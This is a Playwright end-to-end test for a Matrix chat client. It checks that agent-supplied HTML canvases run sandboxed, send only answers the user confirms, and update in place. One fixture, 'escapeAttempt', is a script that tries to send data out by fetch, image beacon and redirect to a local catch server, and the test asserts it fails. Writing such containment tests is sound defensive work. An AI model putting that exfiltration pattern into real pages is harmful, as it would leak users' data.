import { randomUUID } from 'node:crypto';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { expect, test } from '@playwright/test';
import { loginWithPassword } from './helpers/auth';
import { createThreadFixture, joinRoom, matrixFetch, sendRoomMessage } from './helpers/matrix';

// Explicit opt-in to an isolated, disposable local Matrix server with open registration.
const homeserver = process.env.E2E_UI_ACTIONS_HOMESERVER;
test.use({ video: 'off' });

const STEP_ONE = `<p>Which plan?</p>
<button onclick="mindroom.submit({plan: 'basic'}, {label: 'Basic plan'})">Basic</button>
<button onclick="choosePro()">Pro</button>
<script>
  function choosePro() {
    mindroom.submit({plan: 'pro'}, {label: 'Pro plan'});
    // A later scripted submission must not replace the snapshot the user is reviewing.
    setTimeout(() => mindroom.submit({plan: 'everything'}, {label: 'Everything'}), 1000);
  }
</script>`;
const STEP_TWO = `<form data-mindroom-label="Seats chosen">
  <label>Seats <input name="seats" value="3"></label>
  <button>Continue</button>
</form>`;
const escapeAttempt = (exfiltrationOrigin: string) => `<p id="state">Trying to leave</p>
<script>
  fetch('${exfiltrationOrigin}/fetch').catch(() => undefined);
  const image = new Image();
  image.src = '${exfiltrationOrigin}/image';
  setTimeout(() => { location.href = '${exfiltrationOrigin}/navigate'; }, 200);
</script>`;

test('agent canvases run sandboxed, send only confirmed answers, and update in place', async ({
  page,
  context,
}, testInfo) => {
  test.skip(!homeserver, 'Set E2E_UI_ACTIONS_HOMESERVER to a disposable local Matrix server.');
  const origin = new URL(homeserver!);
  expect(origin.protocol).toBe('http:');
  expect(['127.0.0.1', 'localhost', '[::1]']).toContain(origin.hostname);
  const suffix = randomUUID().replaceAll('-', '').slice(0, 12);
  const password = randomUUID();
  const register = (username: string) =>
    matrixFetch<{ access_token: string; user_id: string }>(homeserver!, '/register', {
      method: 'POST',
      body: JSON.stringify({ username, password, auth: { type: 'm.login.dummy' } }),
    });
  const username = `canvas_viewer_${suffix}`;
  const viewer = await register(username);
  const agent = await register(`mindroom_canvas_${suffix}`);
  const server = viewer.user_id.slice(viewer.user_id.indexOf(':') + 1);
  const fixture = await createThreadFixture(homeserver!, viewer.access_token, {
    name: 'Agent canvas',
    topic: 'Local canvas regression',
    rootBody: 'Help me choose a plan',
    replyBody: 'The canvas conversation',
    invite: [agent.user_id],
  });
  await joinRoom(homeserver!, agent.access_token, fixture.roomId);
  const action = (html: string, title = 'Choose a plan') => ({
    version: 1,
    action: 'show_canvas',
    requester_id: viewer.user_id,
    agent_user_id: agent.user_id,
    room_id: fixture.roomId,
    thread_id: fixture.rootId,
    canvas: { title, html },
  });
  const showCanvas = (html: string) =>
    sendRoomMessage(homeserver!, agent.access_token, fixture.roomId, {
      msgtype: 'm.notice',
      body: 'Interactive panel: Choose a plan. Open it in MindRoom Chat to respond.',
      'm.relates_to': { rel_type: 'm.thread', event_id: fixture.rootId },
      'io.mindroom.ui_action': action(html),
    });
  const updateCanvas = (canvasId: string, html: string, title?: string) =>
    sendRoomMessage(homeserver!, agent.access_token, fixture.roomId, {
      msgtype: 'm.notice',
      body: '* Interactive panel updated.',
      'm.new_content': {
        msgtype: 'm.notice',
        body: 'Interactive panel updated.',
        'io.mindroom.ui_action': action(html, title),
      },
      'm.relates_to': { rel_type: 'm.replace', event_id: canvasId },
    });
  const viewerMessages = async () =>
    (
      await matrixFetch<{
        chunk: Array<{ sender: string; content: Record<string, unknown> }>;
      }>(homeserver!, `/rooms/${encodeURIComponent(fixture.roomId)}/messages?dir=b&limit=50`, {
        accessToken: viewer.access_token,
      })
    ).chunk.filter((event) => event.sender === viewer.user_id);

  // Any request reaching this server would be data leaving the canvas sandbox.
  const escapes: string[] = [];
  const listener = createServer((request, response) => {
    escapes.push(request.url ?? '');
    response.end('escaped');
  });
  await new Promise<void>((resolve) => {
    listener.listen(0, '127.0.0.1', resolve);
  });
  const exfiltrationOrigin = `http://127.0.0.1:${(listener.address() as AddressInfo).port}`;
  test.info().attach('exfiltration-origin', { body: exfiltrationOrigin });
  const pageErrors: string[] = [];
  page.on('pageerror', (error) => pageErrors.push(error.message));
  await context.route('**/config.json', async (route) => {
    const response = await route.fetch();
    const config = await response.json();
    await route.fulfill({
      json: {
        ...config,
        homeserverList: [homeserver],
        defaultHomeserver: 0,
        allowCustomHomeservers: true,
        hashRouter: { enabled: false },
        auth: { allowRegistration: false, disablePasswordLogin: false },
        mindroom: {
          ...config.mindroom,
          canvas: { enabled: true },
          uiActions: { autoOpenFromHomeservers: [server] },
        },
      },
    });
  });
  await page.setViewportSize({ width: 1600, height: 1000 });
  await loginWithPassword(page, { homeserver: homeserver!, username, password });
  const waitForLiveSync = () =>
    page.waitForRequest((request) => {
      const url = new URL(request.url());
      return url.pathname.endsWith('/sync') && url.searchParams.get('timeout') === '30000';
    });
  const initialLiveSync = waitForLiveSync();
  await page.goto(
    `/home/${encodeURIComponent(fixture.roomId)}?threadId=${encodeURIComponent(fixture.rootId)}`
  );
  await expect(page.getByText(fixture.replyBody, { exact: true })).toBeVisible();
  await initialLiveSync;
  await page.bringToFront();
  await expect.poll(() => page.evaluate(() => document.hasFocus())).toBe(true);

  // The app-wide frame policy still admits same-origin frames such as Element Call.
  const callFrameLoaded = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        const frame = document.createElement('iframe');
        frame.src = '/public/element-call/index.html';
        frame.style.display = 'none';
        frame.addEventListener('load', () => {
          resolve(frame.contentWindow?.location.pathname === '/public/element-call/index.html');
          frame.remove();
        });
        document.body.appendChild(frame);
      })
  );
  expect(callFrameLoaded).toBe(true);
  // Frames from any other origin are refused before a request; reCAPTCHA registration stays allowed.
  const framePolicy = await page.evaluate(async () => {
    const violations: string[] = [];
    const record = (event: SecurityPolicyViolationEvent) => violations.push(event.blockedURI);
    document.addEventListener('securitypolicyviolation', record);
    const probe = document.createElement('iframe');
    probe.src = 'https://example.org/frame';
    probe.style.display = 'none';
    document.body.appendChild(probe);
    await new Promise((resolve) => {
      setTimeout(resolve, 500);
    });
    probe.remove();
    document.removeEventListener('securitypolicyviolation', record);
    const policy = document
      .querySelector('meta[http-equiv="Content-Security-Policy"]')
      ?.getAttribute('content');
    return { violations, policy };
  });
  // Browsers report only the origin of a blocked cross-origin frame.
  expect(framePolicy.violations).toEqual(['https://example.org']);
  expect(framePolicy.policy).toBe(
    "frame-src 'self' https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/"
  );

  const panel = page.getByRole('complementary', { name: 'Canvas panel' });
  const frame = page.frameLocator('aside[aria-label="Canvas panel"] iframe');
  const send = panel.getByRole('button', { name: 'Send', exact: true });
  const canvasId = await showCanvas(STEP_ONE);
  await expect(panel).toBeVisible();
  await expect(panel.getByText('Interactive panel from')).toBeVisible();
  await expect(panel.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');

  await frame.getByRole('button', { name: 'Pro' }).click();
  await expect(panel.getByText('Send to')).toContainText('Pro plan');
  await page.screenshot({ path: testInfo.outputPath('canvas-staged.png') });
  // The canvas's own follow-up submission cannot swap what the user is reviewing.
  await page.waitForTimeout(1_500);
  await expect(panel.getByText('Send to')).toContainText('Pro plan');
  await expect(send).toBeEnabled();
  expect(
    (await viewerMessages()).some((event) => event.content['io.mindroom.canvas_response'])
  ).toBe(false);
  await send.click();
  await expect(panel.getByText(/Sent to .*Pro plan/)).toBeVisible();

  await expect
    .poll(async () =>
      (await viewerMessages()).find((event) => event.content['io.mindroom.canvas_response'])
    )
    .toBeTruthy();
  const [response] = (await viewerMessages()).filter(
    (event) => event.content['io.mindroom.canvas_response']
  );
  expect(response.content['io.mindroom.canvas_response']).toEqual({
    version: 1,
    canvas_event_id: canvasId,
    canvas_revision_event_id: canvasId,
    agent_user_id: agent.user_id,
    label: 'Pro plan',
    data: { plan: 'pro' },
  });
  expect(response.content.body).toBe(
    `${agent.user_id} Canvas response (${canvasId}, revision ${canvasId}): Pro plan\n{"plan":"pro"}`
  );
  expect(response.content['m.mentions']).toEqual({ user_ids: [agent.user_id] });
  const receipt = page.locator(`[data-canvas-receipt="${canvasId}"]`);
  await expect(receipt).toContainText('Pro plan');
  await expect(page.getByText('Canvas response (', { exact: false })).toHaveCount(0);

  // After an answer, the agent's next step replaces the page in place.
  await updateCanvas(canvasId, STEP_TWO, 'Seats');
  await expect(frame.getByRole('button', { name: 'Continue' })).toBeVisible();
  await expect(panel.getByText('Seats', { exact: true })).toBeVisible();
  await frame.getByRole('button', { name: 'Continue' }).click();
  await expect(panel.getByText('Send to')).toContainText('Seats chosen');
  await expect(send).toBeEnabled();
  await send.click();
  await expect
    .poll(async () =>
      (
        await viewerMessages()
      ).some(
        (event) =>
          (event.content['io.mindroom.canvas_response'] as { data?: unknown } | undefined)?.data &&
          JSON.stringify(
            (event.content['io.mindroom.canvas_response'] as { data: unknown }).data
          ) === '{"seats":"3"}'
      )
    )
    .toBe(true);

  // Work the user has not sent is never replaced without asking.
  await frame.getByRole('textbox').fill('5');
  await updateCanvas(canvasId, escapeAttempt(exfiltrationOrigin), 'Escape attempt');
  await expect(panel.getByText(/updated this panel/)).toBeVisible();
  await expect(frame.getByRole('textbox')).toHaveValue('5');
  await panel.getByRole('button', { name: 'Load update' }).click();
  await expect(frame.locator('#state')).toHaveText('Trying to leave');
  // Whether a browser reports the blocked navigation or not, no request may leave.
  await page.waitForTimeout(1_500);
  expect(escapes).toEqual([]);
  await page.screenshot({ path: testInfo.outputPath('canvas-contained.png') });

  await panel.getByRole('button', { name: 'Close canvas' }).click();
  await expect(panel).toHaveCount(0);
  const openPanel = page.getByRole('button', { name: 'Open panel', exact: true });
  await expect(openPanel).toBeVisible();
  await openPanel.click();
  await expect(panel).toBeVisible();
  await page.waitForTimeout(1_000);
  expect(escapes).toEqual([]);
  expect(pageErrors).toEqual([]);
  await new Promise((resolve) => {
    listener.close(resolve);
  });
});
